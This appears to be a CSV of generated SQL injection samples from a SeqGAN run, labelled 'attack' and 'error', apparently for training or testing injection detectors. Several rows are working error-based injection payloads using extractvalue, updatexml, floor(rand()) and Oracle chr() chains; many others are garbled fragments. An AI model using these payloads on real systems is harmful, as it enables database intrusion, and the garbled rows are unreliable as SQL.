label,payload,family,payload_type,method,run_id,sample_index
attack,"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'u"" like ""altzu",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,170
attack,"1%3775_""  =  ""  3074  ||chr  (  u  (  ,  ))    *as  ||ehr  (  select 1 AINrM end  )   then  SELECTchrr  (  select from r  =aysx.r  select x 0 union selectu   )     d113  )     )   E union end   )     )       113  ,  =  (     )     when   and   ))   )    )   then from =   from or   =select end  )   fromt x 1210  ||ct_r",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,171
attack,1'||  (  select 'fNs,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,172
attack,1'  =  '  =  e 1 concat  select when    )   M 1 Igroupendi,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,173
attack,"-3775*2131)    )    having a 5584 from   (  ||cow113      )    ||coysvygss   (  c  (  >  8190a  5584 or when    x   (  )   #aa or end  t_  (   or where x 1 'i'   select concat  =  6825  ,0x717a767a71,floor  unaaroa"" like ""gyetyIix_resxep  =      (  ,floor   and 5192 x  )   from then dhr  (  (  =  )  *    ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,174
attack,"1""   gs   )     )     )  ||chounltinu",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,175
attack,"1""  =  ""aq)    cast 5305--",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,176
attack,"1\  rand  ,1  4232  112   ""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   "".select",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,177
attack,"S^'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   'b2aal",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,178
attack,1%!z'  =  '5978,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,179
attack,1%q'' like 'adl}te_r.s when     (  case end   (    )0x717a767a712 0   (  casechrnunt  6270,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,180
attack,"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  '_wuz6270'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,181
attack,"-I  )    2e 0   1 union FROM when  (  =  (  ,,  select   select union else 5023   )    ),  SELECT end  )   SELECT 1 information_schema,concat  0  ||r  (  *       4232     )    )  )  1297 '   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  '  '  ||chr  (  ||chr  (  )  ||chr  (  || x  (  =  a   fromanaluin' like 'vx.concatd  (  8190  ||chr  8382  select   113  6082,floor  selecta,vnayys",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,182
attack,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'sas.e  )  )    )   then group else0 6825 chr  (  --a",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,183
attack,"-7864 from  (  ||cr  (  ||M)  (  )    (  4232  )  #2   FROMe Ltr  (  (  )  SELECT vunadsxadrups where  6237)  ) when   fromY LIINdUO.ISUs0x78   cast 4493  0x7171706a71,1    where    (  ),0x717a767a71,  ||U  ||chr   6055  rand  0  (  ||  113  ||chchr  112  a22   (  4232  ||else select union select  else end   )   )",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,184
attack,"-'||  (  select '1  1045))   .chr  =  4232  )    )     from else    >r  (  )   x2   then1x  6237)     FROM thenD unionhr  (  ,  ||ch_  (  (  rand  (  --  6237,  113  ||chr  (  6055  SELECT union LINTIST  (  6825   ,flooruanteau"" like ""i.yU.chos 0 fromouasj7562nun   --aCT,1  ) dk_xostadrt_  (  ||",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,185
attack,"1%%6237""  =  ""njayn",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,186
attack,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'alian",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,187
attack,"1k_etjsnyajsay.namaj.r  113  ||  (  select selectm union2131  *   (  ,  ||cho__reyehr  (  *eat  (   (  case  )   )  44935840adrmy x or AFROMIT  (  ||  (  rand  (  1 D concat  (  (,  select   )    )    )     (,0x717a767a71,  ||chr  ||gxu"" like ""tehoys  select  (  select or select end  )  ||chr  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,188
attack,"1select when  (  case concat  #  6055l  ( 6 m when   (  (  (  ||r  (  ,  4232  ||chr  select 8488 dr  1s *  ||chr  (  (  )  ||chr  )  (  select 1 group I x LIC CV   (  ||STNSkI  rand  (  6055  )  )    WHERE union 0  tl_exsx'  =  'ass fromI.chr  (  (  )  (  0x7171706a71,0x717a767a71)  0  5856  ,,     ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,189
attack,"17864(  )     6237     R  ,  (  ||sxaUUe else when  )  a 0 1 '+  (  select ' d h (  =  )   then 1 where 1 1 thenx  select from (  )  4232  0x7171706a71,0x717a767a71,floor  (  (  )    ,  *2   )    )   then union     )   or or 1 chruadss 'i'   3440  chr  (  =  )     a AND cohr  (  ||  ,  6055  6913  ||chr  (  =  )  9067,     ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,190
attack,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'x5856SELECT LISIMYSbyAM 7158  )    )     ~  )    :GAANNC else where concat  (  select FROM  122  ,  )   (  case when   x  SELECT 'i'  *2     end  )   orx DSINFROM Aends.SELECT INT  =  )   )  6237,  4386,0x717a767a71,concat  (  ||chr  (  select chr  chhr  ||s.cwnt",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,191
attack,"1'   8382     )   froma end 0  )  ,,1   *  )  =  ||chrr  (   a end  ,  case from from select ||chr  (  122  (  ||hrOr  (  >  113  ||chr  (  ||chr  ||  0x7171706a71,selectxaaddrsasau_s end  --l2   select 1 when  (  =  )     )  6,concat  =  select from where 1  1 1 0 dchr  8877a 0 ortounta",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,192
attack,"-""   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""1xxT  =  ,7469  a where D 3931OLILM endfloor  3326i,0x717a767a712 extractvalue  )     1   )   then 1 end  )    )   then xa information_schema.chr  (  )  ,1  ||er.as 0 1 mselect end  select e  else from 0 and 4493",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,193
attack,Nnu,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,194
attack,11htuxeu'  =  'l,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,195
attack," Ie end RNITho""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""unau   8190when  else * from   (  >  ||chr  chr  (  select from  (  (  )   thenx where 4386  ,7469  select from   (  )    case union FROM 0 LINMINThr.Ss  RIMe_rer  4232  ||chr5606 or 1  )     (  case9067||hr  (  ,     )   then and )   x from by end   x  r  ,,concat  select )    select from",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,196
attack,1'||  (  select 'sun,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,197
attack,1'   (   when concat  )  then0x717a767a71=uMt_ire information_schema.cE||  (  ||chr  g  (  (  *   achr  (  *,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,198
attack,"1'   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   'xaale",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,199
attack,else when   (  =  )     )   from     )    AND 1 0 end  )  case   ||chr  (  || hounwab,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,200
attack,"1'   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  'z.nt__vur   7881uaxun",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,201
attack,"1%%""  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  ""MSNUSN'i'5856   WHEREINCT  (  >  (  113,0x717a767a71  )   )     ,llaruna D Ds e Dx_s.r  (  (  =  6237,1   then1x  112     and||bara   tunatrnaaykNcs.gsxaW_ant_xe Rkepr_t",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,202
attack,"1%;1x'||  (  select 'xe'a2 unionASINMI x end   SS0x78 xs end   FROM  ||chowlt   (  (  50239067n,6237#",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,203
attack,"1--y"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""r_blyjwwu"" like ""chro  -  1297SELECT by else concat   (  (  ,  randi  )   then 1 else  x by DNUSTrr  (  (  >hr  (  5840  4232  ||r  (  =  case croweasIs   6270au   select    R by or  union   ||chrhr  (  0   x  select when s by - 1 1  1   FROM 71581  )   then end  case 3785 LITAS",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,204
attack,1Ehufloorublnau,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,205
attack,"1  ,  0x7171706a71b   )    having LINU1392T Dconcathr  ar  (  =  )   or 0 WHERE and from FROM   (  case when  RNLNCT  (  ||r  x  0x7171706a71=  )  )     )  select  where 5023   WHERE end2   from  and 0 else 5192 r select 3074  #",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,206
attack,"1fId' from dual where 7681  =  7681 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  ||'b_('  =  'sau9173n   )   from 5192 1 else 5305a  case FROM 1 concat  =  )   WHERE or U  =  )    --2 0 DS STI concat  select else 6825 when (  (  0 or union (  )  )     )  >hlalealt  8190  113  (  =  )   )     ,1   E and FROM   (  (  )  ||chr  (  ||chrconcat  (  ||ch  (  rand  case group.when  select    ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,207
attack,"-'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'bv' where 3547  =  3547 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161   )    )   ||'",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,208
attack,"1'||  (  select ' Ix.chetu  (  )  aOr  =  ||cEosnt   0e 1  else from   =  || union end  0x4b774c75,  0  select 0 by concat  (  =  6825   then when  (  ||c  0  =  ||chhr  (  =  select 3785)     (  ,0x717a767a71,  x  )         )     ,  ||chr  chr  ||chr  chhr  (  select   )  )    )    ,1  ||couituna from from (  =",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,209
attack,"1,hYh1xserazsn   4232",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,210
attack,"-|' from dual where 7368  =  7368 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,211
attack,"1%Nextractvalue'   )    ,floor  )  =   WHERE end   or--u' like '",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,212
attack,"1""i  =  --",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,213
attack,"1qcastgt_neadrte whener  x  ,floor  (  106  ||chrr  select from :select    d dlsyydzyc_o_altlt_t_ht  (  select c  rand  (  )  ,  ||chr  (  ||chr  (  )  (  U     or unionelse  else group T(  select concat  ||chr  (  =  )  =  ||U from concat  =  )     :=khrorsd.eyneaat",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,214
attack,"1 oru  5023   )     )   or   )      ||chhr  (  (  ||r  (  x  ,4386  ||  chr  (  122  )  ,  ||chr  chr  (  --  0  case DIST E  ,0x717a767a71)  case2  0   :rhrou",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,215
attack,"1""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""%@a' from dual where 7368  =  7368 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'   )ax m group hohr  (  =  ||Su    neraesether     (    ||chr  (  =  )   x   SELECT when end  )   )   thenx union  case 6082r   thenko  a by and where else information_schema group AwhereINT  (  )  =  )  )   )  9325  ,  ui,)   )    )  (  )   )   )       ) from||chr orchazt_r  (  (  )  ||c",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,216
attack,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'j",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,217
attack,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  't  ||chsehr  (  *2 7469  case 0xunxal_s   )     113  ||(  (  rand  (  )  0  toesd",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,218
